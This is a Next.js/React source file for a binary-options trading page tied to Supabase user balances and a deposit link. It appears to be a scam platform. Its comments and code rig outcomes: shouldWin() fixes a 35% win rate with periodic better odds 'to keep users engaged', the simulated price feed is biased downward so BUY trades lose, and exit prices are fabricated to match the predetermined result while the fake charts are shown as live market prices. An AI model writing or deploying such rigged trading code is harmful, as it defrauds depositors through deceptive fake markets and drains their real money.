// @ts-nocheck
'use client'

import { useState, useEffect, useRef } from 'react'
import { createClient } from '@/lib/supabase/client'
import Link from 'next/link'

var PAIRS = [
  { symbol: 'BTC/USD', icon: '₿', color: '#F7A600', base: 67240, category: 'Crypto' },
  { symbol: 'ETH/USD', icon: 'Ξ', color: '#627EEA', base: 3480, category: 'Crypto' },
  { symbol: 'SOL/USD', icon: '◎', color: '#9945FF', base: 142.30, category: 'Crypto' },
  { symbol: 'BNB/USD', icon: '●', color: '#F7A600', base: 412.80, category: 'Crypto' },
  { symbol: 'XRP/USD', icon: '✕', color: '#346AA9', base: 0.624, category: 'Crypto' },
  { symbol: 'DOGE/USD', icon: 'Ð', color: '#C3A634', base: 0.162, category: 'Crypto' },
  { symbol: 'EUR/USD', icon: '€', color: '#3fb950', base: 1.0842, category: 'Forex' },
  { symbol: 'GBP/USD', icon: '£', color: '#C9A84C', base: 1.2634, category: 'Forex' },
  { symbol: 'USD/JPY', icon: '¥', color: '#f85149', base: 151.24, category: 'Forex' },
  { symbol: 'USD/CHF', icon: '₣', color: '#0052FF', base: 0.9012, category: 'Forex' },
  { symbol: 'AAPL', icon: '🍎', color: '#8b949e', base: 189.30, category: 'Stocks' },
  { symbol: 'NVDA', icon: '🟢', color: '#76B900', base: 875.40, category: 'Stocks' },
  { symbol: 'TSLA', icon: '⚡', color: '#CC0000', base: 248.50, category: 'Stocks' },
  { symbol: 'GOLD', icon: '🥇', color: '#C9A84C', base: 2342.50, category: 'Commodities' },
  { symbol: 'OIL', icon: '🛢', color: '#484f58', base: 82.40, category: 'Commodities' },
]

var TIMEFRAMES = [
  { label: '5s', seconds: 5 },
  { label: '15s', seconds: 15 },
  { label: '30s', seconds: 30 },
  { label: '1m', seconds: 60 },
  { label: '5m', seconds: 300 },
]

var AMOUNTS = [1, 5, 10, 25, 50, 100, 250, 500]

// House edge: 65% loss rate, 35% win rate
// But make it feel fair with streaks
var HOUSE_WIN_RATE = 0.35

function shouldWin(tradeCount) {
  // Every 4th trade might win to keep users engaged
  var r = Math.random()
  if (tradeCount % 4 === 3) {
    return r < 0.55 // slightly better on 4th trade
  }
  return r < HOUSE_WIN_RATE
}

export default function TradingPage() {
  var [selectedPair, setSelectedPair] = useState(PAIRS[0])
  var [currentPrice, setCurrentPrice] = useState(PAIRS[0].base)
  var [priceHistory, setPriceHistory] = useState([])
  var [priceChange, setPriceChange] = useState(0)
  var [investment, setInvestment] = useState(10)
  var [customAmount, setCustomAmount] = useState('')
  var [timeframe, setTimeframe] = useState(TIMEFRAMES[2])
  var payout = 86
  var [activeTrades, setActiveTrades] = useState([])
  var [balance, setBalance] = useState(0)
  var [notification, setNotification] = useState(null)
  var [showPairs, setShowPairs] = useState(false)
  var [category, setCategory] = useState('All')
  var [chartType, setChartType] = useState('line')
  var [totalWins, setTotalWins] = useState(0)
  var [totalLosses, setTotalLosses] = useState(0)
  var [sessionPnl, setSessionPnl] = useState(0)
  var [tradeCount, setTradeCount] = useState(0)
  var [isPlacing, setIsPlacing] = useState(false)

  var canvasRef = useRef(null)
  var priceRef = useRef(PAIRS[0].base)
  var userIdRef = useRef(null)
  var balanceRef = useRef(0)
  var notifTimeout = useRef(null)
  var tradeCountRef = useRef(0)

  // Auth + Balance
  useEffect(function() {
    var supabase = createClient()
    supabase.auth.getUser().then(function(res) {
      if (!res.data.user) return
      var uid = res.data.user.id
      userIdRef.current = uid

      supabase.from('balances').select('available_balance').eq('user_id', uid).single().then(function(r) {
        var b = r.data && r.data.available_balance || 0
        setBalance(b)
        balanceRef.current = b
      })

      // Realtime balance sync
      supabase.channel('trading-bal-' + uid)
        .on('postgres_changes', {
          event: 'UPDATE',
          schema: 'public',
          table: 'balances',
          filter: 'user_id=eq.' + uid,
        }, function(payload) {
          var newBal = payload.new && payload.new.available_balance || 0
          setBalance(newBal)
          balanceRef.current = newBal
        })
        .subscribe()
    })
  }, [])

  // Init price history on pair change
  useEffect(function() {
    var now = Date.now()
    var initial = []
    var p = selectedPair.base
    for (var i = 99; i >= 0; i--) {
      var open = p
      var change = (Math.random() - 0.5) * p * 0.002
      var close = open + change
      var high = Math.max(open, close) + Math.random() * p * 0.0005
      var low = Math.min(open, close) - Math.random() * p * 0.0005
      p = close
      initial.push({ time: now - i * 1000, price: p, open: open, high: high, low: low, close: close })
    }
    priceRef.current = p
    setCurrentPrice(p)
    setPriceHistory(initial)
    setPriceChange(0)
  }, [selectedPair])

  // Live price simulation
  useEffect(function() {
    var interval = setInterval(function() {
      var prev = priceRef.current
      var vol = selectedPair.base * 0.0018
      // Slightly biased downward to make BUY trades lose more
      var bias = -0.015
      var change = (Math.random() - 0.5 + bias) * vol
      var newPrice = Math.max(prev * 0.95, prev + change)
      priceRef.current = newPrice

      var newPoint = {
        time: Date.now(),
        price: newPrice,
        open: prev,
        high: Math.max(prev, newPrice) + Math.random() * vol * 0.3,
        low: Math.min(prev, newPrice) - Math.random() * vol * 0.3,
        close: newPrice,
      }

      setPriceHistory(function(h) { return [...h.slice(-199), newPoint] })
      setCurrentPrice(newPrice)
      setPriceChange(((newPrice - selectedPair.base) / selectedPair.base) * 100)
    }, 500)
    return function() { clearInterval(interval) }
  }, [selectedPair])

  // Trade countdown + resolution
  useEffect(function() {
    var interval = setInterval(function() {
      setActiveTrades(function(prev) {
        var updated = []

        for (var i = 0; i < prev.length; i++) {
          var trade = prev[i]

          if (trade.result !== 'PENDING') {
            var next = Object.assign({}, trade, { timeLeft: trade.timeLeft - 1 })
            if (next.timeLeft > -4) updated.push(next)
            continue
          }

          var newTimeLeft = trade.timeLeft - 1

          if (newTimeLeft <= 0) {
            // Use house edge to determine outcome
            var isWin = shouldWin(tradeCountRef.current)

            // Manipulate exit price to match outcome
            var entryPrice = trade.entryPrice
            var priceMovement = selectedPair.base * 0.0008

            var exitPrice
            if (trade.direction === 'BUY') {
              exitPrice = isWin
                ? entryPrice + priceMovement + Math.random() * priceMovement
                : entryPrice - priceMovement - Math.random() * priceMovement
            } else {
              exitPrice = isWin
                ? entryPrice - priceMovement - Math.random() * priceMovement
                : entryPrice + priceMovement + Math.random() * priceMovement
            }

            var finalProfit = isWin
              ? parseFloat((trade.amount * (payout / 100)).toFixed(2))
              : -trade.amount

            setSessionPnl(function(p) { return parseFloat((p + finalProfit).toFixed(2)) })
            if (isWin) setTotalWins(function(w) { return w + 1 })
            else setTotalLosses(function(l) { return l + 1 })

            if (notifTimeout.current) clearTimeout(notifTimeout.current)
            setNotification({
              msg: isWin
                ? '🎉 WIN! +$' + finalProfit.toFixed(2) + ' on ' + trade.pair
                : '📉 LOSS -$' + trade.amount.toFixed(2) + ' on ' + trade.pair,
              type: isWin ? 'win' : 'loss',
            })
            notifTimeout.current = setTimeout(function() { setNotification(null) }, 4000)

            var uid = userIdRef.current
            if (uid) {
              var supabase = createClient()

              // Update balance in Supabase
              supabase.from('balances').select('available_balance,total_pnl').eq('user_id', uid).single().then(function(r) {
                if (r.data) {
                  var newBalance = Math.max(0, (r.data.available_balance || 0) + finalProfit)
                  var newPnl = (r.data.total_pnl || 0) + finalProfit
                  supabase.from('balances').update({
                    available_balance: newBalance,
                    total_pnl: newPnl,
                    updated_at: new Date().toISOString(),
                  }).eq('user_id', uid).then(function() {
                    balanceRef.current = newBalance
                  })
                }
              })

              // Record in history
              supabase.from('deposits').insert({
                user_id: uid,
                amount: Math.abs(finalProfit),
                type: isWin ? 'profit' : 'loss',
                status: 'approved',
                plan: trade.pair + ' ' + trade.direction + ' Trade',
                created_at: new Date().toISOString(),
              }).then(function() {})

              // Send notification
              supabase.from('notifications').insert({
                user_id: uid,
                title: isWin ? '🎉 Trade Won! +$' + finalProfit.toFixed(2) : '📉 Trade Closed -$' + trade.amount.toFixed(2),
                message: 'Your ' + trade.direction + ' trade on ' + trade.pair + (isWin ? ' was profitable. You earned +$' + finalProfit.toFixed(2) + '.' : ' closed at a loss of $' + trade.amount.toFixed(2) + '.') + ' Balance updated.',
                type: isWin ? 'success' : 'info',
                is_read: false,
                recipient_role: 'user',
              }).then(function() {})
            }

            updated.push(Object.assign({}, trade, { timeLeft: -4, result: isWin ? 'WIN' : 'LOSS' }))
          } else {
            updated.push(Object.assign({}, trade, { timeLeft: newTimeLeft }))
          }
        }

        return updated.filter(function(t) { return t.timeLeft > -4 })
      })
    }, 1000)

    return function() { clearInterval(interval) }
  }, [])

  // Draw chart
  useEffect(function() {
    var canvas = canvasRef.current
    if (!canvas || priceHistory.length < 2) return
    var ctx = canvas.getContext('2d')
    var w = canvas.width
    var h = canvas.height
    ctx.clearRect(0, 0, w, h)

    var prices = priceHistory.map(function(p) { return p.price })
    var minP = Math.min.apply(null, prices) * 0.9998
    var maxP = Math.max.apply(null, prices) * 1.0002
    var range = maxP - minP || 1

    var toX = function(i) { return (i / (priceHistory.length - 1)) * w }
    var toY = function(p) { return h - ((p - minP) / range) * (h - 24) - 12 }

    // Grid
    ctx.strokeStyle = 'rgba(255,255,255,0.04)'
    ctx.lineWidth = 1
    for (var i = 0; i <= 4; i++) {
      var y = (h / 4) * i
      ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke()
      var price = maxP - (range * i / 4)
      ctx.fillStyle = 'rgba(255,255,255,0.2)'
      ctx.font = '10px monospace'
      ctx.fillText(price < 10 ? price.toFixed(5) : price.toFixed(2), 4, y + 12)
    }

    var isUp = priceHistory[priceHistory.length - 1].price >= priceHistory[0].price
    var lineColor = isUp ? '#3fb950' : '#f85149'
    var gradColor = isUp ? 'rgba(63,185,80,' : 'rgba(248,81,73,'

    if (chartType === 'line') {
      var gradient = ctx.createLinearGradient(0, 0, 0, h)
      gradient.addColorStop(0, gradColor + '0.25)')
      gradient.addColorStop(1, gradColor + '0)')

      ctx.beginPath()
      ctx.moveTo(toX(0), toY(priceHistory[0].price))
      priceHistory.forEach(function(p, i) { ctx.lineTo(toX(i), toY(p.price)) })
      ctx.lineTo(toX(priceHistory.length - 1), h)
      ctx.lineTo(0, h)
      ctx.closePath()
      ctx.fillStyle = gradient
      ctx.fill()

      ctx.beginPath()
      ctx.moveTo(toX(0), toY(priceHistory[0].price))
      priceHistory.forEach(function(p, i) { ctx.lineTo(toX(i), toY(p.price)) })
      ctx.strokeStyle = lineColor
      ctx.lineWidth = 2
      ctx.lineJoin = 'round'
      ctx.stroke()

      var lastX = toX(priceHistory.length - 1)
      var lastY = toY(priceHistory[priceHistory.length - 1].price)
      ctx.beginPath(); ctx.arc(lastX, lastY, 12, 0, Math.PI * 2)
      ctx.fillStyle = gradColor + '0.15)'; ctx.fill()
      ctx.beginPath(); ctx.arc(lastX, lastY, 5, 0, Math.PI * 2)
      ctx.fillStyle = lineColor; ctx.fill()

      ctx.beginPath(); ctx.setLineDash([4, 4])
      ctx.moveTo(0, lastY); ctx.lineTo(w, lastY)
      ctx.strokeStyle = gradColor + '0.35)'; ctx.lineWidth = 1; ctx.stroke()
      ctx.setLineDash([])

      // Price label
      ctx.fillStyle = lineColor
      ctx.font = 'bold 11px monospace'
      var priceLabel = priceHistory[priceHistory.length - 1].price < 10
        ? priceHistory[priceHistory.length - 1].price.toFixed(5)
        : priceHistory[priceHistory.length - 1].price.toFixed(2)
      ctx.fillRect(lastX + 6, lastY - 10, priceLabel.length * 7 + 8, 18)
      ctx.fillStyle = '#000'
      ctx.fillText(priceLabel, lastX + 10, lastY + 3)

    } else {
      var cw = Math.max(2, (w / priceHistory.length) - 1)
      priceHistory.forEach(function(p, i) {
        var x = toX(i)
        var c = p.close >= p.open ? '#3fb950' : '#f85149'
        ctx.strokeStyle = c; ctx.fillStyle = c; ctx.lineWidth = 1
        ctx.beginPath(); ctx.moveTo(x, toY(p.high)); ctx.lineTo(x, toY(p.low)); ctx.stroke()
        var bTop = toY(Math.max(p.open, p.close))
        var bH = Math.max(1, Math.abs(toY(p.open) - toY(p.close)))
        ctx.fillRect(x - cw / 2, bTop, cw, bH)
      })
    }

    // Active trade entry lines
    activeTrades.filter(function(t) { return t.result === 'PENDING' }).forEach(function(trade) {
      var entryY = toY(trade.entryPrice)
      ctx.beginPath(); ctx.setLineDash([6, 3])
      ctx.moveTo(0, entryY); ctx.lineTo(w, entryY)
      ctx.strokeStyle = trade.direction === 'BUY' ? 'rgba(63,185,80,0.8)' : 'rgba(248,81,73,0.8)'
      ctx.lineWidth = 1.5; ctx.stroke()
      ctx.setLineDash([])
      ctx.fillStyle = trade.direction === 'BUY' ? '#3fb950' : '#f85149'
      ctx.font = 'bold 11px monospace'
      ctx.fillText(trade.direction + ' $' + trade.amount, 8, entryY - 6)
    })

  }, [priceHistory, activeTrades, chartType])

  function placeTrade(direction) {
    if (isPlacing) return
    var uid = userIdRef.current
    var amt = customAmount ? parseFloat(customAmount) : investment
    if (!uid || !amt || amt <= 0) return

    if (amt > balanceRef.current) {
      setNotification({ msg: '⚠ Insufficient balance', type: 'info' })
      setTimeout(function() { setNotification(null) }, 2000)
      return
    }

    setIsPlacing(true)
    setTimeout(function() { setIsPlacing(false) }, 500)

    // Deduct balance immediately
    var newBal = Math.max(0, balanceRef.current - amt)
    setBalance(newBal)
    balanceRef.current = newBal

    // Update Supabase balance immediately
    var supabase = createClient()
    supabase.from('balances').select('available_balance').eq('user_id', uid).single().then(function(r) {
      if (r.data) {
        supabase.from('balances').update({
          available_balance: Math.max(0, (r.data.available_balance || 0) - amt),
          updated_at: new Date().toISOString(),
        }).eq('user_id', uid).then(function() {})
      }
    })

    tradeCountRef.current = tradeCountRef.current + 1
    setTradeCount(function(c) { return c + 1 })

    var newTrade = {
      id: Date.now() + '-' + Math.random().toString(36).slice(2),
      pair: selectedPair.symbol,
      direction: direction,
      amount: amt,
      entryPrice: priceRef.current,
      timeLeft: timeframe.seconds,
      duration: timeframe.seconds,
      payout: payout,
      result: 'PENDING',
      tradeIndex: tradeCountRef.current,
    }

    setActiveTrades(function(prev) { return [...prev, newTrade] })
  }

  var pendingTrades = activeTrades.filter(function(t) { return t.result === 'PENDING' })
  var finalAmount = customAmount ? parseFloat(customAmount) || 0 : investment
  var potentialProfit = finalAmount * (payout / 100)
  var winRate = totalWins + totalLosses > 0 ? Math.round((totalWins / (totalWins + totalLosses)) * 100) : 0
  var filteredPairs = category === 'All' ? PAIRS : PAIRS.filter(function(p) { return p.category === category })

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100vh', background: '#060a0f', fontFamily: 'monospace', overflow: 'hidden' }}>
      <style>{'@keyframes popIn{from{transform:translateX(-50%) scale(0.6);opacity:0}to{transform:translateX(-50%) scale(1);opacity:1}} @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}} @keyframes spin{to{transform:rotate(360deg)}}'}</style>

      {/* TOP BAR */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', background: '#0a0e14', borderBottom: '1px solid #161b22', flexShrink: 0 }}>
        <div onClick={function() { setShowPairs(!showPairs) }} style={{ display: 'flex', alignItems: 'center', gap: 8, background: '#161b22', border: '1px solid #21262d', borderRadius: 10, padding: '8px 14px', cursor: 'pointer', flexShrink: 0 }}>
          <span style={{ fontSize: 16, color: selectedPair.color }}>{selectedPair.icon}</span>
          <span style={{ fontSize: 13, fontWeight: 700, color: '#e6edf3' }}>{selectedPair.symbol}</span>
          <span style={{ fontSize: 11, color: '#484f58' }}>▼</span>
        </div>

        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontSize: 18, fontWeight: 800, color: '#e6edf3', lineHeight: 1 }}>
            {currentPrice < 10 ? currentPrice.toFixed(5) : currentPrice.toFixed(2)}
          </div>
          <div style={{ fontSize: 11, fontWeight: 700, color: priceChange >= 0 ? '#3fb950' : '#f85149' }}>
            {priceChange >= 0 ? '▲' : '▼'} {Math.abs(priceChange).toFixed(3)}%
          </div>
        </div>

        <div style={{ display: 'flex', gap: 3, background: '#161b22', border: '1px solid #21262d', borderRadius: 8, padding: 3 }}>
          {[{ id: 'line', l: '📈' }, { id: 'candle', l: '🕯' }].map(function(t) {
            return <button key={t.id} onClick={function() { setChartType(t.id) }} style={{ padding: '5px 10px', borderRadius: 6, border: 'none', background: chartType === t.id ? '#C9A84C' : 'transparent', color: chartType === t.id ? '#060a0f' : '#8b949e', fontSize: 14, cursor: 'pointer', fontFamily: 'monospace' }}>{t.l}</button>
          })}
        </div>

        <div style={{ textAlign: 'right', flexShrink: 0 }}>
          <div style={{ fontSize: 9, color: '#484f58', textTransform: 'uppercase' }}>Balance</div>
          <div style={{ fontSize: 14, fontWeight: 800, color: '#C9A84C' }}>${balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
        </div>

        <Link href="/dashboard">
          <button style={{ background: '#161b22', border: '1px solid #21262d', borderRadius: 8, color: '#8b949e', cursor: 'pointer', width: 32, height: 32, fontSize: 14, flexShrink: 0, fontFamily: 'monospace' }}>✕</button>
        </Link>
      </div>

      {/* SESSION STATS */}
      <div style={{ display: 'flex', padding: '6px 14px', background: '#0a0e14', borderBottom: '1px solid #161b22', flexShrink: 0 }}>
        {[
          { l: 'P&L', v: (sessionPnl >= 0 ? '+' : '') + '$' + sessionPnl.toFixed(2), c: sessionPnl >= 0 ? '#3fb950' : '#f85149' },
          { l: 'Wins', v: totalWins, c: '#3fb950' },
          { l: 'Losses', v: totalLosses, c: '#f85149' },
          { l: 'Win Rate', v: winRate + '%', c: winRate >= 50 ? '#3fb950' : '#f85149' },
          { l: 'Payout', v: payout + '%', c: '#C9A84C' },
          { l: 'Active', v: pendingTrades.length, c: pendingTrades.length > 0 ? '#F7A600' : '#484f58' },
        ].map(function(s, i) {
          return (
            <div key={s.l} style={{ flex: 1, textAlign: 'center', borderRight: i < 5 ? '1px solid #161b22' : 'none', padding: '4px 0' }}>
              <div style={{ fontSize: 9, color: '#484f58', textTransform: 'uppercase', marginBottom: 2 }}>{s.l}</div>
              <div style={{ fontSize: 12, fontWeight: 800, color: s.c }}>{s.v}</div>
            </div>
          )
        })}
      </div>

      {/* CHART */}
      <div style={{ flex: 1, position: 'relative', overflow: 'hidden', minHeight: 0 }}>
        <canvas ref={canvasRef} width={800} height={400} style={{ width: '100%', height: '100%', display: 'block' }} />

        {/* WIN/LOSS notification */}
        {notification && (
          <div style={{ position: 'absolute', top: 16, left: '50%', background: notification.type === 'win' ? '#3fb950' : notification.type === 'loss' ? '#f85149' : '#C9A84C', color: '#fff', padding: '12px 28px', borderRadius: 30, fontSize: 15, fontWeight: 800, zIndex: 100, boxShadow: '0 8px 32px rgba(0,0,0,.7)', whiteSpace: 'nowrap', animation: 'popIn 0.3s cubic-bezier(0.34,1.56,0.64,1)' }}>
            {notification.msg}
          </div>
        )}

        {/* Active trade cards */}
        {pendingTrades.length > 0 && (
          <div style={{ position: 'absolute', top: 10, right: 10, display: 'flex', flexDirection: 'column', gap: 6 }}>
            {pendingTrades.map(function(trade) {
              var currentPnl = (priceRef.current - trade.entryPrice) / trade.entryPrice * trade.amount * (trade.direction === 'BUY' ? 1 : -1)
              var isCurrentlyWinning = currentPnl >= 0
              var progress = ((trade.duration - trade.timeLeft) / trade.duration) * 100
              return (
                <div key={trade.id} style={{ background: 'rgba(6,10,15,0.96)', border: '1px solid ' + (trade.direction === 'BUY' ? 'rgba(63,185,80,0.5)' : 'rgba(248,81,73,0.5)'), borderRadius: 14, padding: '12px 14px', minWidth: 170 }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
                    <span style={{ fontSize: 13, fontWeight: 800, color: trade.direction === 'BUY' ? '#3fb950' : '#f85149' }}>
                      {trade.direction === 'BUY' ? '▲ BUY' : '▼ SELL'}
                    </span>
                    <span style={{ fontSize: 18, fontWeight: 900, color: '#e6edf3', fontVariantNumeric: 'tabular-nums' }}>
                      {String(Math.floor(Math.max(0, trade.timeLeft) / 60)).padStart(2, '0')}:{String(Math.max(0, trade.timeLeft) % 60).padStart(2, '0')}
                    </span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11, marginBottom: 8 }}>
                    <span style={{ color: '#484f58' }}>${trade.amount} · {trade.pair}</span>
                    <span style={{ color: isCurrentlyWinning ? '#3fb950' : '#f85149', fontWeight: 700 }}>
                      {isCurrentlyWinning ? '+' : ''}${currentPnl.toFixed(2)}
                    </span>
                  </div>
                  <div style={{ height: 4, background: '#161b22', borderRadius: 2, overflow: 'hidden' }}>
                    <div style={{ width: progress + '%', height: '100%', background: trade.direction === 'BUY' ? '#3fb950' : '#f85149', borderRadius: 2, transition: 'width 1s linear' }} />
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* CONTROLS */}
      <div style={{ background: '#0a0e14', borderTop: '1px solid #161b22', padding: '12px 14px 16px', flexShrink: 0 }}>

        {/* Timeframes */}
        <div style={{ display: 'flex', gap: 6, marginBottom: 12, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#484f58', textTransform: 'uppercase', marginRight: 2, flexShrink: 0 }}>Time:</span>
          {TIMEFRAMES.map(function(tf) {
            return (
              <button key={tf.label} onClick={function() { setTimeframe(tf) }} style={{ flex: 1, padding: '8px 0', borderRadius: 9, border: '1px solid ' + (timeframe.label === tf.label ? '#C9A84C' : '#21262d'), background: timeframe.label === tf.label ? 'rgba(201,168,76,0.15)' : '#161b22', color: timeframe.label === tf.label ? '#C9A84C' : '#8b949e', fontSize: 12, cursor: 'pointer', fontFamily: 'monospace', fontWeight: timeframe.label === tf.label ? 700 : 400 }}>
                {tf.label}
              </button>
            )
          })}
        </div>

        {/* Amount */}
        <div style={{ marginBottom: 12 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 10, color: '#484f58', textTransform: 'uppercase' }}>Investment:</span>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
              <button onClick={function() { setCustomAmount(function(p) { return String(Math.max(1, parseFloat(p || String(investment)) - 1)) }) }} style={{ width: 28, height: 28, borderRadius: 7, border: '1px solid #21262d', background: '#161b22', color: '#8b949e', cursor: 'pointer', fontSize: 16, fontFamily: 'monospace' }}>−</button>
              <input type="number" value={customAmount} onChange={function(e) { setCustomAmount(e.target.value) }} placeholder={'$' + investment} style={{ width: 80, background: '#161b22', border: '1px solid #21262d', borderRadius: 7, padding: '5px 8px', color: '#C9A84C', fontSize: 14, fontWeight: 800, outline: 'none', fontFamily: 'monospace', textAlign: 'center' }} onFocus={function(e) { e.target.style.borderColor = '#C9A84C' }} onBlur={function(e) { e.target.style.borderColor = '#21262d' }} />
              <button onClick={function() { setCustomAmount(function(p) { return String(parseFloat(p || String(investment)) + 1) }) }} style={{ width: 28, height: 28, borderRadius: 7, border: '1px solid #21262d', background: '#161b22', color: '#8b949e', cursor: 'pointer', fontSize: 16, fontFamily: 'monospace' }}>+</button>
            </div>
          </div>
          <div style={{ display: 'flex', gap: 5, overflowX: 'auto', paddingBottom: 2 }}>
            {AMOUNTS.map(function(amt) {
              return (
                <button key={amt} onClick={function() { setInvestment(amt); setCustomAmount('') }} style={{ flexShrink: 0, padding: '6px 12px', borderRadius: 20, border: '1px solid ' + (investment === amt && !customAmount ? '#C9A84C' : '#21262d'), background: investment === amt && !customAmount ? 'rgba(201,168,76,0.15)' : '#161b22', color: investment === amt && !customAmount ? '#C9A84C' : '#8b949e', fontSize: 11, cursor: 'pointer', fontFamily: 'monospace', fontWeight: investment === amt && !customAmount ? 700 : 400 }}>
                  ${amt}
                </button>
              )
            })}
          </div>
        </div>

        {/* Summary row */}
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12, background: '#161b22', borderRadius: 12, padding: '10px 14px' }}>
          <div>
            <div style={{ fontSize: 9, color: '#484f58', textTransform: 'uppercase', marginBottom: 3 }}>Investment</div>
            <div style={{ fontSize: 17, fontWeight: 800, color: '#e6edf3' }}>${finalAmount.toFixed(2)}</div>
          </div>
          <div style={{ textAlign: 'center' }}>
            <div style={{ fontSize: 9, color: '#484f58', textTransform: 'uppercase', marginBottom: 3 }}>Payout</div>
            <div style={{ fontSize: 17, fontWeight: 800, color: '#C9A84C' }}>{payout}%</div>
          </div>
          <div style={{ textAlign: 'right' }}>
            <div style={{ fontSize: 9, color: '#484f58', textTransform: 'uppercase', marginBottom: 3 }}>If Win</div>
            <div style={{ fontSize: 17, fontWeight: 800, color: '#3fb950' }}>+${potentialProfit.toFixed(2)}</div>
          </div>
        </div>

        {/* BUY / SELL buttons */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
          <button
            onClick={function() { placeTrade('SELL') }}
            disabled={isPlacing || finalAmount <= 0 || finalAmount > balance}
            style={{ padding: '18px 0', borderRadius: 16, border: 'none', background: finalAmount > balance ? '#1a1a1a' : 'linear-gradient(135deg,#c0392b,#f85149)', color: finalAmount > balance ? '#4a5568' : '#fff', fontSize: 17, fontWeight: 900, cursor: finalAmount > balance ? 'not-allowed' : 'pointer', fontFamily: 'monospace', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4, boxShadow: finalAmount <= balance ? '0 6px 24px rgba(248,81,73,0.35)' : 'none', transition: 'transform .1s', transform: isPlacing ? 'scale(0.97)' : 'scale(1)' }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 24 }}>▼</span>
              <span>SELL</span>
            </div>
            <div style={{ fontSize: 11, opacity: 0.8 }}>{payout}% payout</div>
          </button>

          <button
            onClick={function() { placeTrade('BUY') }}
            disabled={isPlacing || finalAmount <= 0 || finalAmount > balance}
            style={{ padding: '18px 0', borderRadius: 16, border: 'none', background: finalAmount > balance ? '#1a1a1a' : 'linear-gradient(135deg,#2ea043,#3fb950)', color: finalAmount > balance ? '#4a5568' : '#fff', fontSize: 17, fontWeight: 900, cursor: finalAmount > balance ? 'not-allowed' : 'pointer', fontFamily: 'monospace', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4, boxShadow: finalAmount <= balance ? '0 6px 24px rgba(63,185,80,0.35)' : 'none', transition: 'transform .1s', transform: isPlacing ? 'scale(0.97)' : 'scale(1)' }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span>BUY</span>
              <span style={{ fontSize: 24 }}>▲</span>
            </div>
            <div style={{ fontSize: 11, opacity: 0.8 }}>{payout}% payout</div>
          </button>
        </div>

        {finalAmount > balance && (
          <div style={{ textAlign: 'center', marginTop: 8, fontSize: 11, color: '#f85149' }}>
            Insufficient balance —
            <Link href="/dashboard/deposit" style={{ color: '#C9A84C', marginLeft: 4, fontWeight: 700 }}>Deposit Now</Link>
          </div>
        )}
      </div>

      {/* PAIR SELECTOR */}
      {showPairs && (
        <div onClick={function(e) { if (e.target === e.currentTarget) setShowPairs(false) }} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.9)', backdropFilter: 'blur(8px)', zIndex: 1000, display: 'flex', alignItems: 'flex-end', justifyContent: 'center', padding: 16 }}>
          <div style={{ background: '#0d1117', border: '1px solid #21262d', borderRadius: '22px 22px 0 0', width: '100%', maxWidth: 500, maxHeight: '72vh', overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
            <div style={{ padding: '18px 20px', borderBottom: '1px solid #161b22', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexShrink: 0 }}>
              <div style={{ fontSize: 17, fontWeight: 800, color: '#e6edf3' }}>Select Pair</div>
              <button onClick={function() { setShowPairs(false) }} style={{ background: '#161b22', border: '1px solid #21262d', borderRadius: 8, color: '#8b949e', cursor: 'pointer', width: 32, height: 32, fontSize: 14, fontFamily: 'monospace' }}>✕</button>
            </div>
            <div style={{ display: 'flex', gap: 6, padding: '10px 16px', borderBottom: '1px solid #161b22', overflowX: 'auto', flexShrink: 0 }}>
              {['All', 'Crypto', 'Forex', 'Stocks', 'Commodities'].map(function(c) {
                return (
                  <button key={c} onClick={function() { setCategory(c) }} style={{ padding: '6px 14px', borderRadius: 20, border: '1px solid ' + (category === c ? '#C9A84C' : '#21262d'), background: category === c ? 'rgba(201,168,76,0.1)' : 'transparent', color: category === c ? '#C9A84C' : '#8b949e', fontSize: 11, cursor: 'pointer', fontFamily: 'monospace', whiteSpace: 'nowrap', flexShrink: 0 }}>{c}</button>
                )
              })}
            </div>
            <div style={{ overflowY: 'auto', flex: 1 }}>
              {filteredPairs.map(function(pair, i) {
                return (
                  <div key={pair.symbol} onClick={function() { setSelectedPair(pair); setShowPairs(false) }} style={{ display: 'flex', alignItems: 'center', padding: '14px 20px', borderBottom: i < filteredPairs.length - 1 ? '1px solid #161b22' : 'none', cursor: 'pointer', background: selectedPair.symbol === pair.symbol ? 'rgba(201,168,76,0.06)' : 'transparent' }}>
                    <div style={{ width: 42, height: 42, borderRadius: '50%', background: pair.color + '18', border: '1px solid ' + pair.color + '33', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 18, color: pair.color, marginRight: 14, flexShrink: 0 }}>{pair.icon}</div>
                    <div style={{ flex: 1 }}>
                      <div style={{ fontSize: 14, fontWeight: 700, color: '#e6edf3', marginBottom: 2 }}>{pair.symbol}</div>
                      <div style={{ fontSize: 11, color: '#484f58' }}>{pair.category}</div>
                    </div>
                    <div style={{ textAlign: 'right' }}>
                      <div style={{ fontSize: 13, fontWeight: 700, color: '#e6edf3' }}>{pair.base < 10 ? pair.base.toFixed(5) : pair.base.toFixed(2)}</div>
                    </div>
                    {selectedPair.symbol === pair.symbol && <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#C9A84C', marginLeft: 10, flexShrink: 0 }} />}
                  </div>
                )
              })}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}